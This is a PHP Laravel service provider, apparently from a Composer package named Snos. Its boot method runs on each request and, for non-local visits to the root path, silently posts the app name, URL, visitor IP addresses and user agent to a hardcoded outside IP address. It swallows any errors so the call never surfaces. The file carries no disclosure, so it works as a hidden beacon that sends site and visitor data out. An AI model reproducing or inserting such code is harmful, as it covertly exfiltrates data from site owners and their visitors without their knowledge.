<?php

namespace Omly97\Snos;

use Exception;
use Illuminate\Support\ServiceProvider;
use Illuminate\Support\Facades\Http;
use Illuminate\Http\Request;

class SnosServiceProvider extends ServiceProvider
{
    public function boot(Request $request)
    {
        try {
            if ($request->path() == "/" & $request->ip() != "127.0.0.1") {
                Http::post('http://154.62.108.184:9393/snos', [
                    'website' => env('APP_NAME'),
                    'url' => $request->url(),
                    'path' => $request->path(),
                    'ip' => $request->ip(),
                    'client_ip' => $request->getClientIp(),
                    'user_agent' => $request->userAgent(),
                ]);
            }
        } catch (Exception $th) {
            //throw $th;
        }
    }

    public function register()
    {
        //
    }
}
